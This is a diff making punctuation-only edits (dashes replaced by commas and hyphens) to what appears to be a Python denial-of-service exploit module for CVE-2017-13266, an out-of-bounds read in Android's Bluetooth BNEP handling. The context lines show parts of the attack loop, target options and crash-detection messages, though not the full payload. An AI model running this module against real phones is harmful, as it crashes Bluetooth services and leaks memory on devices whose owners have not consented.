@@ -9,7 +9,7 @@ missing length from out-of-bounds memory inside `bnep_process_control_packet()`
 in bnep_utils.cc → crash or info disclosure of the OOB byte.
 
 Companion to `bnep_heap_disclosure.py` (EDB-44326).
-Pure passive RFCOMM/L2CAP transport — no auth required.
+Pure passive RFCOMM/L2CAP transport, no auth required.
 """
 
 import struct
@@ -37,7 +37,7 @@ BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01
 
 # Affected Android versions
 AFFECTED = [
-    "Android 5.1.1, 6.0–6.0.1, 7.0–7.1.2, 8.0–8.1",
+    "Android 5.1.1, 6.0-6.0.1, 7.0-7.1.2, 8.0-8.1",
     "Patched in March 2018 Security Bulletin",
 ]
 
@@ -73,7 +73,7 @@ class Module(DosModule):
             ),
             "src_bdaddr": ModuleOption(
                 name="src_bdaddr", required=False, default="",
-                description="Local source BD_ADDR (optional — pybluez auto-selects)",
+                description="Local source BD_ADDR (optional, pybluez auto-selects)",
             ),
             "count": ModuleOption(
                 name="count", required=False, default=1,
@@ -104,7 +104,7 @@ class Module(DosModule):
         print(f"  {C.RED}║{C.RESET}  {C.BOLD}Android BNEP OOB Read DoS  CVE-2017-13266{C.RESET}         {C.RED}║{C.RESET}")
         print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
         print_info(f"Target : {target}  BNEP PSM 0x{BNEP_PSM:04X}")
-        print_warning("Authorized testing only — may crash com.android.bluetooth")
+        print_warning("Authorized testing only, may crash com.android.bluetooth")
 
         sock = None
         sent = 0
@@ -136,9 +136,9 @@ class Module(DosModule):
                         oob_bytes.append(data.hex())
                         print(f"    response: {data.hex()}")
                     else:
-                        print(f"    no response — target likely crashed")
+                        print(f"    no response, target likely crashed")
                 except bluetooth.btcommon.BluetoothError:
-                    print(f"    no response — target likely crashed")
+                    print(f"    no response, target likely crashed")
                 except Exception:
                     pass
                 time.sleep(0.2)
